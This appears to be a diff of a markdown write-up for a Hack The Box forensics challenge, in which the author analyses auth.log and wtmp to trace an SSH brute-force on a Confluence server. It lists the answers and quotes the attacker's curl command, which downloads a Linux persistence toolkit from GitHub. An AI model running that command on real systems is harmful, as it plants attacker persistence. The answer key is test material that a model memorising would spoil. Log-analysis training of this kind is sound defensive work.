@@ -1,37 +1,42 @@
-
-
 ##### Sherlock Scenario
 
 In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
 
+___
 
-Q1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
+### Q1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
 
-A: 65.2.161.68
+#### A: 65.2.161.68
 
 Opening the auth.log file we see a lot of entries about Invalid user from the same ip, i would assume that this ip is the attacker's.
 
 ![](../../Img/Pasted%20image%2020250425142803.png)
 
-Q2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
+___
 
-A: root
+### Q2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
+
+#### A: root
 
 Looking further down we can find the username (searching for success didn't work, but accepted works)
 
 ![](../../Img/Pasted%20image%2020250425143038.png)
 
-Q3: Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
+___
 
-A: 2024-03-06 06:32:45
+### Q3: Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
+
+#### A: 2024-03-06 06:32:45
 
 In the wtmp file (after utmpdump bc u cant open the file just like that). We search for the root acc and the ip of the attacker and find the answer
 
 ![](../../Img/Pasted%20image%2020250425144054.png)
 
-Q4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+___
 
-A: 37
+### Q4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+
+#### A: 37
 
 This one is in the auth.log file, following the path of this questions, we can assume that it is asking for the manual login. (as oppose to the automated one, that being the first successful login of root with the attacker ip)
 
@@ -68,3 +73,5 @@ A: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/lin
 Just below the last question we see the answer.
 
 ![](../../Img/Pasted%20image%2020250425145615.png)
+
+Tags: [Log Analysis](../../Index/Log%20Analysis.md) 
